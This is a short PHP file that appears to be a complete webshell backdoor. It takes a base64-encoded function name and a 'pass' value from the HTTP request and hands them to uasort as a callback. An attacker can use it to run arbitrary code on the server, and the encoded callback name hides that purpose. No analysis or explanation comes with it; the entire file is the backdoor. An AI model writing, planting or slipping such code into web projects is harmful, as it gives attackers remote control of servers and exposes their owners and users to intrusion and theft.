<?php
$e = $_REQUEST['e'];
$arr = array('test', $_REQUEST['pass']);
uasort($arr, base64_decode($e));
?>